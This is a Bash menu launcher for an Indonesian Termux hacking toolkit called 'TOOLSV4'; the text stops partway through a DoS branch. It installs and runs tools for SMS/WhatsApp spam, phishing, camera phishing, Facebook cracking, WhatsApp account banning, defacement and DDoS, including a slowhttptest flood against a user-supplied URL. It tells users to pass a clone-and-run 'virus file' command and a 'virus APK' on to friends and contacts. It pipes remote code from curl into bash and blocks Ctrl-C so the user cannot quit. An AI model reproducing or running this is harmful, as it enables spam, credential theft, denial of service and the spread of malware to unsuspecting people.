
q="-e"
e="echo "
s="sleep 1"
ss="sleep 2"
sss="sleep 3"
v="4.2.0"
m="\033[1;31m"
h="\033[1;32m"
k="\033[1;33m"
b="\033[1;34m"
bl="\033[1;36m"
p="\033[1;37m"																													passwd="dosatol" 																											titid="YbfmtmsuYybralowPOnhrnAhemtGALIRUSOfiicialw"
url="xdg-open "
clear
jam=$(date +"%k")
tanggal=$(date +" %d %B %Y")
if [[ $jam -ge 0 && $jam -lt 10 ]]; then
ucapan="Pagi"
elif [[ $jam -ge 10 && $jam -lt 15 ]]; then
ucapan="Siang"
elif [[ $jam -ge 15 && $jam -lt 18 ]]; then
ucapan="Sore"
else
ucapan="Malam"
fi
hari=$(date +%A)
ucap=""
case $hari in
"Monday") ucap="Senin!";;
"Tuesday") ucap="Selasa!";;
"Wednesday") ucap="Rabu!";;
"Thursday") ucap="Kamis!";;
"Friday") ucap="Jumat!";;
"Saturday") ucap="Sabtu!";;
"Sunday") ucap="Minggu!";;
esac
killall play
shuffle_string() {
str=$1
arr=($(echo $str | sed -e 's/\(.\)/\1 /g'))
for i in $(seq 0 $((${#arr[@]} - 2))); do
j=$(($(($RANDOM % $((${#arr[@]} - $i)))) + $i))
tmp=${arr[$i]}
arr[$i]=${arr[$j]}
arr[$j]=$tmp
done
echo ${arr[@]} | sed -e 's/ //g'
}
allowed_chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
shuffled_chars=$(shuffle_string $allowed_chars)
password_length=10
word=${shuffled_chars:0:$password_length}
clear
echo $q  $b
cowsay -f eyes " System Scannning ...! " | lolcat
echo
echo $q $b "┌─────────────────────────────────────────────────┐"
echo $q $b "│ $b [$m •$b ]$p Notifikasi  $m  :$k Selamat$m $ucapan$k !$b          │"
echo $q $b "│ $b [$k •$b ]$p Sekarang Jam$m  :$k $(date +"%H:%M")$b                    │"
echo $q $b "│ $b [$h •$b ]$p Sekarang Hari$m :$k $ucap,$tanggal$b │"
echo $q $b "├─────────────────────────────────────────────────┘"
echo $q $b "│"
gal="anda_sudah_terdaftar"
login_password="password123"
if [ -f "$gal" ]; then
play -q sound/hello.mp3
$e $q $b "│ ┌───────────────┐"
$e $q $b "├─┤$m VERIFIKASI$p ID$b │"
$e $q $b "│ └───────────────┘"
function show_loading() {
local x=0
local delay=0.1
local spin_chars="-\|/"
local spin_length=${#spin_chars}
while true; do
local char=${spin_chars:x++%spin_length:1}
printf '\r%s'  " └► Verifikasi [ $char ]"
sleep $delay
done
}
show_loading &
sleep 10
kill $!
printf '\r%s\n' " └► Anda sudah terdaftar"
play -q sound/robot2.mp3 &>/dev/null
trap ctrl_c INT
ctrl_c() {
clear
echo $q $k "Anda tidak Bisa$m Keluar$k Dengan cara ini"
sleep 3
clear
bash README.sh
}
clear
play -q sound/welcome.mp3  &>/dev/null &
echo $q $bl
text="      Selamat Datang Di TOOLSV4 $v"
delay=0.05 # penundaan antara setiap karakter (deti>
for ((i=0; i<${#text}; i++)); do
echo -n "${text:$i:1}"
sleep $delay
done
sleep 3
while true
do
cd $HOME/TOOLSV4/galirus
clear
killall play &>/dev/null &
sleep 1
music_files=("music1.mp3" "music2.mp3" "music3.mp3" "music.mp3")
random_index=$((RANDOM % ${#music_files[@]}))
music_file="${music_files[random_index]}"
sleep 2
play -q sound/$music_file repeat &>/dev/null &
play -q sound/robot2.mp3 &>/dev/null &
echo
echo $q $b"╔══════════════════════════════════════════════════╗$b"
echo $q $b"║          _     _     _     _     _               ║"
echo $q $b"║         / \   / \   / \   / \   / \              ║"
echo $q $b"║        ($m T$b ) ($m O$b ) ($m O$b ) ($m L$b ) ($m S$b )             ║"
echo $q $b"║         \_/   \_/   \_/   \_/   \_/$bl V4 $b          ║"
echo $q $b"║                                                  ║"
echo $q $b"╚══════════════════════════════════════════════════╝$b"
echo $q $b"                ║                 ║"
sleep 2.1
echo $q $b"╔══════════════════════════════════════════════════╗$b"
echo $q $b"║  $m•$p Author$bl :$h GALIRUS PROJECTS             $b       $b ║"
echo $q $b"║  $k•$p Github$bl :$h github.com/Galirus404        $b       $b ║"
echo $q $b"║  $b•$p Donsai$bl :$h https://saweria.co/Galirus     $b     $b ║"
echo $q $b"║  $bl•$p Versi $bl :$m $v                   $b            $b ║"
echo $q $b"╚══════════════════════════════════════════════════╝$b"
echo $q $b"                ║                 ║"
echo $q $b"╔══════════════════════════════════════════════════╗$b"
echo $q $b"║     $m      SILAHKAN PILIH TOOLS DIBAWAH      $b    $b ║"
echo $q $b"╚══════════════════════════════════════════════════╝$b"
echo $q $b"                ║                 ║"
echo $q $b"╔══════════════════════════════════════════════════╗$b"
echo $q $b"║             $m STABILIZER JARINGAN          $b    $b   ║"
echo $q $b"╚══════════════════════════════════════════════════╝$b"
echo $q $b"║$k [ J1 ]$b ║$h SIGNYAL BOOSTER                        $b ║"
echo $q $b"║$k [ J2 ]$b ║$h DNS                                    $b ║"
echo $q $b"╚══════════════════════════════════════════════════╝$b"
echo $q $b"                ║              $b ║"
echo $q $b"╔══════════════════════════════════════════════════╗$b"
echo $q $b"║               $m LIST SPAM KODE +62   $b          $b   ║"
echo $q $b"╚══════════════════════════════════════════════════╝$b"
echo $q $b"║$k [ S1 ]$b ║$h SPAM SMS&WA  $m                          $b ║"
echo $q $b"║$k [ S2 ]$b ║$h SPAM CALL                              $b ║"
echo $q $b"║$k [ S3 ]$b ║$m SPAM SMS   (OFF)                       $b ║"
echo $q $b"║$k [ S4 ]$b ║$h SPAM SMS&WA NO STOP                    $b ║"
echo $q $b"║$k [ S5 ]$b ║$h SPAM SMS&WA NO STOP                    $b ║"
echo $q $b"║$k [ S6 ]$b ║$h SPAM SMS&WA NO STOP                    $b ║"
echo $q $b"║$k [ S7 ]$b ║$h SPAM SMS&WA NO STOP                    $b ║"
echo $q $b"║$k [ S8 ]$b ║$h SPAM BOT OTP ALL                       $b ║"
echo $q $b"╚══════════════════════════════════════════════════╝$b"
echo $q $b"                ║              $b ║"
echo $q $b"╔══════════════════════════════════════════════════╗$b"
echo $q $b"║      $m       LIST PHISING & HACKING  $b             ║"
echo $q $b"╚══════════════════════════════════════════════════╝$b"
echo $q $b"║$k [ 11 ]$b ║$h SEEKER                                 $b ║"
echo $q $b"║$k [ 12 ]$b ║$h ZPHISHER                               $b ║"
echo $q $b"║$k [ 13 ]$b ║$h PENYAMAR PHISING                       $b ║"
echo $q $b"║$k [ 14 ]$b ║$h NGROK                                  $b ║"
echo $q $b"║$k [ 15 ]$b ║$h IP LOKASI                              $b ║"
echo $q $b"║$k [ 16 ]$b ║$h VIRUS CCTV BJORKA                      $b ║"
echo $q $b"║$k [ 17 ]$b ║$h PENJELAJAH NAME                        $b ║"
echo $q $b"║$k [ 18 ]$b ║$h INSTALL NETHUNTER FULL ( DESKTOP )     $b ║"
echo $q $b"║$k [ 19 ]$b ║$h CAMERA PHISING                         $b ║"
echo $q $b"║$k [ 20 ]$b ║$h BACKUP FILE/FOLDER                     $b ║"
echo $q $b"║$k [ 21 ]$b ║$h IMEI TRACKER                           $b ║"
echo $q $b"║$k [ 22 ]$b ║$h CHECK IP WEBSITE                       $b ║"
echo $q $b"║$k [ 23 ]$b ║$h TESSSV2 By : MR.FORCES                 $b ║"
echo $q $b"║$k [ 24 ]$b ║$h TOOLSV1 By : TC20                      $b ║"
echo $q $b"║$k [ 25 ]$b ║$h PENYAMAR PHISING II                    $b ║"
echo $q $b"║$k [ 26 ]$b ║$h ENCRYPT BASH BY.GALIRUS404             $b ║"
echo $q $b"║$k [ 27 ]$b ║$h CRACK FACEBOOK BY.BRAYEN               $b ║"
echo $q $b"║$k [ 28 ]$b ║$h Download VIDEO YOUTUBE,TIKTOK          $b ║"
echo $q $b"║$k [ 29 ]$b ║$h DOWNLOAD YOUTUBE MP3                   $b ║"
echo $q $b"║$k [ 30 ]$b ║$h ADB DEBUGGING                          $b ║"
echo $q $b"║$k [ 31 ]$b ║$h INSTALLASI MODULE TERMUX/NETHUNTER     $b ║"
echo $q $b"║$k [ 32 ]$b ║$h LINK DOSA                              $b ║"
echo $q $b"║$k [ 33 ]$b ║$h TOOLS-TERMUX BY.JHON                   $b ║"
echo $q $b"║$k [ 34 ]$b ║$h INSTALL & MENJALANKAN BOT DI TERMUX    $b ║"
echo $q $b"║$k [ 35 ]$b ║$h KARMA DDOS                             $b ║"
echo $q $b"║$k [ 36 ]$b ║$h DEFACE                                 $b ║"
echo $q $b"║$k [ 37 ]$b ║$h TAMPILAN V5 TERMUX                     $b ║"
echo $q $b"║$k [ 38 ]$b ║$h UNBAN WHATSAPP                         $b ║"
echo $q $b"║$k [ 39 ]$b ║$h KENON WHATSAPP                         $b ║"
echo $q $b"║$k [ 40 ]$b ║$h OSINT TOOLS                            $b ║"
echo $q $b"║$k [ 41 ]$b ║$h SAQAHAYANG DDOS                        $b ║"
echo $q $b"║$k [ 42 ]$b ║$h VIRUS FILE                             $b ║"
echo $q $b"║$k [ 43 ]$b ║$h VIRUS APK                              $b ║"
echo $q $b"║$k [ 44 ]$b ║$h CAMERA PHISING 1                       $b ║"
echo $q $b"║$k [ 45 ]$b ║$h CAMERA PHISING 2                       $b ║"
echo $q $b"║$k [ 46 ]$b ║$h DOS Overload                           $b ║"
echo $q $b"║$k [ 47 ]$b ║$h OSINT ( FREE )                         $b ║"
echo $q $b"╚══════════════════════════════════════════════════╝$b"
echo $q $b"                ║              $b ║"
echo $q $b"╔══════════════════════════════════════════════════╗$b"
echo $q $b"║$k      $m BOT WHATSAPP LEGAL EDUCATION     $b       $b   ║"
echo $q $b"╚══════════════════════════════════════════════════╝"
echo $q $b"║$k [ Bot1 ]$b ║$h BOT B*g Menu METODE SCAN QR          $b ║"
echo $q $b"║$k [ Bot2 ]$b ║$h AI WHATSAPP ( BUKAN BOT )            $b ║"
echo $q $b"╚══════════════════════════════════════════════════╝$b"
echo $q $b"                ║              $b ║"
echo $q $b"╔══════════════════════════════════════════════════╗$b"
echo $q $b"║$k      $m   LIST  NETHUNTER/KALI LINUX     $b       $b   ║"
echo $q $b"╚══════════════════════════════════════════════════╝"
echo $q $b"║$k [ Dos1 ]$b ║$h DOS ( SLOWHTTPTEST )                 $b ║"
echo $q $b"║$k [ Dos2 ]$b ║$h DOS ( GOLDEN EYES )                  $b ║"
echo $q $b"║$k [ Dos3 ]$b ║$h DOS ( THC-SSL-DOS )                  $b ║"
echo $q $b"║$k [ Dos4 ]$b ║$h CHECK PORT ( NMAP  )                 $b ║"
echo $q $b"║$k [ meta ]$b ║$h METASPLOIT                           $b ║"
echo $q $b"║$k [ exif ]$b ║$h EXIFTOOL scanning ( FOTO,VIDEO )     $b ║"
echo $q $b"╚══════════════════════════════════════════════════╝$b"
echo $q $b"                ║              $b ║"
echo $q $b"╔══════════════════════════════════════════════════╗$b"
echo $q $b"║$k      $m          PEMBERITAHUAN        $b           $b  ║"
echo $q $b"╚══════════════════════════════════════════════════╝"
echo $q $b"║$k [ update ]$b ║$h TOOLSV4                           $b  ║"
echo $q $b"║$k [ patner ]$b ║$h JADIKAN TOOLSV4 ( TAMPILAN AWAL ) $b  ║"
echo $q $b"║$k [  info  ]$b ║$h LIST UPDATE TOOLSV4               $b  ║"
echo $q $b"║$k [ report ]$b ║$h LAPORKAN BUG                      $b  ║"
echo $q $b"║$k [    0   ]$b ║$h EXIT$b                               $b ║"
echo $q $b"╚══════════════════════════════════════════════════╝"
sleep 1
echo $q $b "    ┌───────────────────────────┐"
echo $q $b "╭───┤$bl •$m Galirus Official$b        ┃$b"
echo $q $b "├───┤$k •$m Selamat $ucapan           $b│"
echo $q $b "├───┤$h •$m Sekarang jam :$jam:$(date +"%M") $waktu$b    │"
echo $q $b "│   └───────────────────────────┘"
read -p ' ╰─────────▶ ' no
echo $q $h
if [ "$no" = "J1" ]
then
#KATEGORIJARINGAN
apt install figlet -y
clear
figlet "SPEED TEST" | lolcat
echo $q $m "				by.GALIRUS$b 404"
ifconfig
$e $q $k "Mau Menstabilkan Sinyal ? Copy$m IP ADDRESS$k Di Atas Yah ...!"
$e $q $h
read -p "IP ADDRESS > " apa
echo $q $bl "Menyiapkan Susunan Kode !$m Sabar ...$k !"
$ss
echo $q $b "MULAI ...$bl :)"
sleep 2.0
echo $q $h
ping -s 999 $apa
elif [ "$no" = "J2" ]
then
echo $q $bl "Menyiapkan Susunan Kode !$m Sabar ...$k !"
$ss
echo $q $b "MULAI ...$bl :)"
sleep 1.0
echo $q $h
ping 8.8.8.8

#KATEGORI SPAM

elif [ "$no" = "S1" ]
then
$e $k "Menginstall package"
cd /sdcard
git clone https://github.com/oranginisiald/multinum
cd multinum
git pull
bash install.sh
$e $k "Membuka Spam"
sleep 3
clear
python3 run.py
echo $q $k
read -p  "ENTER UNTUK MENGULANG TOOLSV4"

elif [ "$no" = "S2" ]
then
cd $HOME
cd TOOLSV4/galirus
echo $q $k "MEMBUKA SPAM CALL"
python Run.py
echo $q $k
read -p	  "ENTER UNTUK MENGULANG TOOLSV4"

elif [ "$no" = "S3" ]
then
clear
echo $q $m "MOKAD / COID Masih dalam tembaruan/pengatian Admin"
echo
echo
echo
read -p  "ENTER UNTUK MENGULANG TOOLSV4"

elif [ "$no" = "S4" ]
then
clear
echo $q $k"Menginstall Package"
sleep 2
apt update
cd /sdcard
git clone https://github.com/BrayenHack/SPAMBotW4
cd SPAMBotW4
git pull
clear
echo $q $b "MASUKKAN nomor awalan :$m 085"
python3 main.py
echo $q $k
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "S5" ]
then
cd $HOME/TOOLSV4/galirus
chmod 777 404.py
echo $q $k "MEMBUKA SPAM"
sleep 3
clear
python3 404.py
sleep 3
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "S6" ]
then
sleep 2
clear
echo $q $k "Membuka SPAM$h "
cd $HOME/TOOLSV4/galirus
pip install -r bahan.txt
clear
echo $q $h "Password :madara"
echo $q $k "Silahkan COPY password di atas !"
read -p "Enter Untuk Melanjutkan" enter
clear
echo $q $k "Masukkan Nomor Tanpa$h +62$k /$h 0"
python3 Xs_run.py
echo $q $k
read -p  "ENTER UNTUK MENGULANG TOOLSV4"

elif [ "$no" = "S7" ]
then
clear
apt update
apt install git figlet bash
pip install rich requests
cd /sdcard
git clone https://github.com/rickyfazaa/MySPAMBot-OTP
cd MySPAMBot-OTP
git pull
echo $q $k " Membuka Spam OTP"
sleep 2
python main.py
read -p "ENTER UNTUK MENGULANG TOOLSV4"

elif [ $no = "S8" ]
then
cd $HOME/TOOLSV4/galirus
python3 bot.py
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus
cd /sdcard 

#KATEGORI PHISING & HACKING

elif [ "$no" = "11" ]
then
sleep 1
clear
echo $q $k "MEMBUKA Seeker$h "
echo $q $h
sleep 2
pip3 install packaging psutil
cd /sdcard
git clone https://github.com/thewhiteh4t/seeker
cd seeker
git pull
chmod 777 install.sh
bash install.sh
clear
echo $q $k"Seeker membutuhkan module Tambahan Yaitu ngrok\n Jika belum Install Silahkan Install Dulu ngroknya"
sleep 10
clear
python3 seeker.py
echo $q $k
read -p  "ENTER UNTUK MENGULANG TOOLSV4"

elif [ "$no" = "12" ]
then
echo $q $k "Menginstall ZPHISHER$h "
echo $q $h
cd /sdcard
git clone https://github.com/htr-tech/zphisher
cd zphisher
git pull
chmod 777 zphisher.sh
echo $q $k "Membuka TOOLS"
bash zphisher.sh
echo $q $k
read -p  "ENTER UNTUK MENGULANG TOOLSV4"

elif [ "$no" = "13" ]
then
cd /sdcard
git clone https://github.com/jaykali/maskphish
cd maskphish
git pull
sleep 1
echo $q $k "MEMBUKA PENYAMAR PHISING"
echo $q $h
sleep 2
clear
bash maskphish.sh
sleep 3
echo $q $bl "LINK SUCCESS Dibuat Silahkan Copy Link Yang Berwarna HIJAU"
sleep 5
echo $q $k
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "14" ]
then
sleep 2
clear
echo $q $k "INSTALL NGROK"
sleep 2
cd /sdcard
git clone https://github.com/Galirus404/NGROK
cd NGROK
git pull
chmod 777 ngrok.sh
bash ngrok.sh
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no"  = "15" ]
then
clear
sleep 2
echo $q $k "Menginstall IP LOKASI"
sleep 2
cd /sdcard
git clone https://github.com/maldevel/IPGeoLocation
cd IPGeoLocation
pip3 install -r requirements.txt
clear
sleep 2
figlet "IP 404"
echo $q $h
read -p "Masukkan IP target > " ini
sleep 3
echo $q $b "]===============>$bl {$m SUCCESS$bl }$b <=================["
python3 ipgeolocation.py -t $iniA
sleep 2
echo $q $k
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "16" ]
then
clear
figlet "G-404"
sleep 2
echo $q $k"MEMBUKA BROWSING"
sleep 5
$url "https://www.mediafire.com/file/e5o2dwijf9piehu/dc04995667a74482aa50715689ba3802.zip/file"
echo $q $k
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "17" ]
then
clear
sleep 2
echo $q $k "Menginstall PENJELAJAH NAME"
cd /sdcard
git clone https://github.com/mishakorzik/UserFinder
cd UserFinder
git pull
echo $q $k "MEMBUKA SCRIPT"
sleep 3
clear
bash UserFinder.sh
echo $q $k
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "18" ]
then
clear
sleep 2
echo $q $k "INSTALL NETHUNTER"
cd /sdcard
git clone https://github.com/Galirus404/NETHUNTER
cd NETHUNTER
git pull
bash install.sh
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "19" ]
then
echo $q $k " Menginstall Cam Hack"
sleep 2
apt install git php wget curl jq openssh
cd /sdcard
git clone https://github.com/LiNuX-Mallu/CAM-DUMPER.git
cd CAM-DUMPER
git pull
chmod +x camdumper.sh
echo $q $k "MEMBUKA CAM HACK"
sleep 2
clear
bash camdumper.sh
echo $q $k
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "20" ]
then
clear
echo $q $k "MENGINSTALL PACKAGE"
sleep 2
cd /sdcard
git clone https://github.com/Galirus404/BACKUP
cd BACKUP
git pull
clear
echo $q $k "MEMBUKA BACKUP"
sleep 2
clear
bash backup.sh
$e $q $k
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "21" ]
then
echo $q $k "Membuka IMEI TRACKER"
$url "https://imei-tracker.com/track/"
elif [ "$no" = "22" ]
then
clear
echo $q $k "MEMBUKA BROWSING CHECK HOSTING"
sleep 3
$url "https://check-host.net/"
elif [ "$no" = "23" ]
then
clear
echo "Menginstall Package"
sleep 3
apt update
apt install git
apt install python-pip
apt install toilet
rm -rf TESSSV1 && rm -rf TESSSV2
cd /sdcard
git clone https://github.com/Mrforces/TESSSV2
cd TESSSV2
chmod +x *
gem install lolcat
apt install figlet
git pull
clear
echo $q $k "Selesai Menginstall Package"
sleep 3
clear
bash TOOLSV2.sh
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "24" ]
then
echo $q $k "Menginstall package"
sleep 2
apt update
apt install bash
apt install python
apt install git
apt install ruby
gem install lolcat
pip install requests
cd /sdcard
git clone https://github.com/fahadsyihab06/Toolsv1
cd Toolsv1
clear
echo $q $k "Membuka TOOLS"
sleep 2
git pull
bash toolsv1.sh
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "25" ]
then
echo $q $k "Membuka browsing"
sleep 3
$url "https://grabify.link/"
elif [ "$no" = "26" ]
then
echo $q $k "Menginstall ENCRYPT"
sleep 3
apt update
apt install git
cd TOOLSV3
echo $q $k "MEMBUKA ECRYPT"
sleep 3
clear
sleep 3
echo $q $m
echo -ne "	TOLONG di baca dan PAHAM I Cog\r"
sleep 2
echo $q $h
echo -ne "	Siapkan SCRIPT ANDA DI INTERNAL AWAL\r"
sleep 5
echo -ne "	karena Script ini berkerja di INTERMAL\r"
sleep 5
echo $q $b
read -p "	Enter untuk Melanjutkan" enter
clear
bash galirus.sh
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "27" ]
then
apt install python python3
apt install git
pip install stdiomask
pip install requests
pip install bs4
pip install requests
pip install rich
pip install mechanize
cd /sdcard
git clone https://github.com/BrayennnXD/Brayennn3.4
cd Brayennn3.4
git pull
clear
echo $q $k "Membuka Crack Facebook"
sleep 2
python3 BrayennnFB.py
python3 BrayennFB.py
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "28" ]
then
echo $q $k "Siapkan Dulu/Salin Link Yang mau di Download"
sleep 5
read -p "ENTER untuk Melanjutkan" ld
clear
echo $q $k "Membuka Link "
sleep 3
$url "https://id.savefrom.net/1-cara-mengunduh-video-youtube-160oX.html"
elif [ "$no" = "29" ]
then
echo $q $k "Siapkan dulu/salin Link yang mau di Download"
sleep 5
read -p "ENTER untuk Melanjutkan" id
clear
echo $q $k "Membuka Link"
sleep 3
$url "https://ytmp3.nu/9A1f/"
elif [ "$no" = "30" ]
then
apt update
apt install git
apt install python3
cd $HOME
git clone https://github.com/Galirus404/ADB
cd ADB
git pull origin main
clear
echo $q $k "Membuka ADB DEBUGGING"
bash adb.sh
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "31" ]
then
echo $q $k "Installasi package"
sleep 2
apt install -y curl ; bash -c "$(curl -L gitee.com/mo2/linux/raw/2/2)"
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "32" ]
then
url2="xdg-open "
clear
echo "NJIR nyari DOSA :v "
read -p "Username : " dosa
if [ $dosa = "dosabang" ]; then
sleep 2
clear
echo $q $k " ADMIN TIDAK TANGGUNG JAWAB\n ATAS RESIKO PENYESALAN KALIAN"
$e $q $bl
read -p " Masukkan Pilihan (1-6): " jir
if [ $jir = "1" ]
then
$e $q "Anda memilih 1"
$url2 "https://www.mediafire.com/file/tdc8wsqqm07u1ph/2028.7z/file?dkey=3liqmf5ttdk&r=438"
elif [ $jir = "2" ]
then
$e $q "Anda memilih 2"
$url2 "https://www.mediafire.com/file/cjzn898bnq4rga5/2004.7z/file?dkey=lb41i1qn07g&r=1912"
elif [ $jir = "3" ]
then
$e $q "Anda memilih 3"
$url2 "https://www.mediafire.com/file/vec7se3y03gy78y/2070.7z/file"
elif [ $jir = "4" ]
then
$e $q "Anda memilih 4"
$url2 "https://www.mediafire.com/file/b9eln67qgnqymnf/1322.7z/file?dkey=wdnoaydojkv&r=1271"
elif [ $jir = "5" ]
then
$e $q "Anda memilih 5"
$url2 "https://www.mediafire.com/file/oanpipgai1jmst4/2225.7z/file?dkey=4809hl76mbs&r=604"
elif [ $jir = "6" ]
then
$e $q "Anda memilih 6"
$url2 "https://vm.tiktok.com/ZSNpa6XfL/"
else
$e "Pilihan Tidak Valid"
fi
else
$e $q $m "salah bang usernamenya ulang ke toolsv4 hehe"
fi
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "33" ]
then
echo $q $k " installasi package"
apt install git -y
apt install figlet -y
cd /sdcard
git clone https://github.com/MR-JHONZ/HFT-TOOLS
cd HFT-TOOLS
git pull
clear
echo $q $h "MENJALANKAN PACKAGE"
sleep 2.1
bash MRSANZ-1.sh
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ "$no" = "34" ]
then
echo $q $k "Installasi bahan"
sleep 3
bash bahan.sh
echo $q $k "Membuka installasi BOT"
sleep 3
clear
bash bot.sh
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ $no = "35" ]
then
cd /sdcard
git clone https://github.com/HyukIsBack/KARMA-DDoS
cd KARMA-DDoS
pip3 install -r requirements.txt
git pull
clear
python3 setup.py
python3 main.py
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ $no = "36" ]
then
cd $HOME
git clone https://github.com/Galirus404/Deface
cd Deface
bash deface.sh
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ $no = "37" ]
then
clear
cd /sdcard
apt update
apt upgrade
apt install python2 -y
apt install git -y
git clone https://github.com/h20-studio/T4MPILAN-V5
cd T4MPILAN-V5
python2 style5.py
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ $no = "38" ]
then
cd $HOME
git clone https://github.com/MR-JHONz/UNBAN
cd UNBAN
git pull origin main
xdg-open "https://wa.me/6283151697416?text=assalamualaikum%20bang%20passwd%20Unban%20apa"
bash UNBAN.sh
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ $no = "39" ]
then
cd $HOME
git clone https://github.com/MR-JHONz/KenonWa.git
cd KenonWa
git pull origin main
read -p "ENTER UNTUK MEMINTA PASSWORD LOGIN"
xdg-open "https://wa.me/6283151697416?text=assalamualaikum%20bang%20passwd%20kenonwa%20apa"
bash BANNED.sh
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ $no = "40" ]
then
cd $HOME
git clone https://github.com/MR-JHONz/OsintTSC.git
cd OsintTSC
git pull origin main
bash TSC_OSINT.sh
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ $no = "41" ]; then
cd galirus
clear
python3 saqahayang.py
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ $no = "42" ]; then
clear
killall play
$e $q $m " ANDA MEMILIH UNTUK MENGGUNAKAN VIRUS FILE BY.GALIRUS OFFICIAL$p"
play -q sound/njirvirus.mp3 &>/dev/null &
text="Virus file berbasis script Yaitu adalah virus yang menyerang penyimpanan internal dengan menggunakan file, jumlah file yang terkirim unlimited,virus file ini bisa berkerja di latar belakang tanpa sepengetahuan target/penguna, jadi penguna/target pandangan nya akan teralihkan ke script yang bisa di bilang umpan !"
delay=0.05 # penundaan antara setiap karakter (detik)
for ((i=0; i<${#text}; i++)); do
echo -n "${text:$i:1}"
sleep $delay
done
echo $q $m
read -p "ENTER UNTUK MELANJUTKAN"
clear
cd $HOME/TOOLSV4
play -q sound/virus.mp3 &>/dev/null &
sleep 15
play -q sound/virus2.mp3 &>/dev/null &
$e $q $m "SILAHKAN SALIN COMMAND DI BAWAH INI, SILAHKAN BAGIKAN KE TEMAN,GROUP,KONTAK,STATUS$p"
echo
$e "pkg update && pkg upgrade"
$e "pkg install git bash"
$e "git clone https://github.com/Galirus404/HACKGG"
$e "cd HACKGG"
$e "bash gas.sh"
echo $q $k
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ $no = "43" ]; then
clear
$e $q $p " ANDA MEMILIH UNTUK MENDOWNLOAD VIRUS APK"
$e $q $h " Harap jangan di pasang di hp anda sendiri, itu namanya tolol !"
$e $q $h " Kalo Masih Mau Coba sendiri Sediakan Saja Virtual Android Dan Install Di Dalamnya"
$e $q $h " Silahkan Bagikan ke ,GROUP,KONTAK,SW ( KALO BISA ) "
echo $q $m
read -p " ENTER UNTUK MELANJUTKAN"
sleep 2
clear
$e $q " MEMBUKA BROWSER"
xdg-open "https://sfile.mobi/7hLVjW0q0EU"
elif [ $no = "44" ]; then
apt-get -y install php openssh git wget
cd /sdcard
git clone https://github.com/techchipnet/CamPhish
cd CamPhish
bash camphish.sh
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ $no = "45" ]; then
cd /sdcard
git clone https://github.com/KasRoudra/CamHacker
cd CamHacker
bash ch.sh
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus

elif [ $no = "46" ]; then
apt install python3 python3-pip git -y
git clone https://github.com/7zx/overload
cd overload
pip install -r requirements.txt
clear
python3 overload.py
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus
elif [ $no = "47" ]; then
pip3 install instaloader
pip3 install phonenumbers
cd $HOME/TOOLSV4/galirus
python3 osint.py
read -p "ENTER UNTUK MENGULANGI TOOLSV4" galirus
#KATEGORI BOT WHATSAPP
elif [ $no = "Bot1" ]
then
clear
echo $q $b "[$bl 1$b ]$k Unduh & Pasang"
echo $q $b "[$bl 2$b ]$k Jalankan Bot Yang Sudah Terunduh"
echo $q $b "[$bl 0$b ]$k kembali ke TOOLSV4$bl"
read -p " pilih ( 0-2 ) :" bot
if [ $bot = "1" ]; then
cd /storage/emulated/0/Download/
echo $q $h " Intalling Package Dulu"
echo
read -p "  Enter Untuk Ya"
apt install nodejs imagemagick git nodejs ffmpeg libwebp  yarn -y
clear
sleep 2
killall play
play -q sound/bot.mp3 &>/dev/null
xdg-open "https://www.mediafire.com/file/5awepr51u0qm81k/Bot1.zip/file"
read -p "Enter Jika File Download Benar Benar sudah Selesai"
echo "Ekstrak Bot1"
echo
sleep 2
unzip Bot1.zip
clear
echo $q $h "Ekstrak Success$b"
read -p "ENTER UNTUK MENGULANGI TOOLSV4"
elif [ $bot = "2" ]; then
echo "Menjalankan Bot1"
sleep 2
cd /storage/emulated/0/Download/Bot1
npm start
elif [ $bot = "0" ]; then
echo "KEMBALI KE TOOLSV4"
else
echo "Input Salah Ulangi lagi"
fi

elif [ $no = "Bot2" ]; then
clear
echo " Mengarahkan Ke Whatsapp"
xdg-open "https://wa.me/19176942789?txt=hallo siapa anda"

#KATEGORI NETHUNTER
elif [ "$no" = "Dos1" ]
then
echo $q $k "Menginstall Package"
sleep 2
sudo apt install slowhttptest
sleep 2
echo $q $k "Berhasil Menginstall"
clear
echo $q $m "Contoh :$h https://google.com"
sleep 5
read -p "URL target > " ini
slowhttptest -c 1000 -H -g -o slowhttp -i 100 -r 200 -t GET -u $ini/index.php -x 24 -p 3
read -p "Enter Untuk Mengulang TOOLSV4" 

elif [ "$no" = "Dos2" ]
then
